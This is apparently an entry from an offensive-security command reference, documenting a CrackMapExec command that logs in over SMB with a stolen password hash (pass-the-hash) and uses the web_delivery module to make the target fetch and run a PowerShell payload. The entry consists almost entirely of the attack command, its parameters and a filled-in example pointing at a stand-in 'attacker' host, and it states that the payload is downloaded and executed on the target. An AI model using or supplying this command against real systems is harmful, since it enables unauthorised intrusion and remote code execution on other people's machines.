---
type: command
executor: bash
data: cme smb $_TARGET -u $_USER -H $_HASH -M web_delivery -o URL=\"$_URL\"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - smb
  - payload-delivery
verified: true
validated: true
---

# cme-smb-web-delivery

## Command

```bash
cme smb $_TARGET -u $_USER -H $_HASH -M web_delivery -o URL="$_URL"
```

## Description

Delivers PowerShell payload via web delivery module.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target | Yes |
| -u $_USER | User | Yes |
| -H $_HASH | Hash | Yes |
| -M web_delivery | Module | Yes |
| -o URL="$_URL" | Payload URL | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.100 -u Admin -H ":hash" -M web_delivery -o URL="https://attacker:80/posh"
```

## Expected Output

Payload downloaded and executed on target.

## Related

- [[tools/CrackMapExec]]
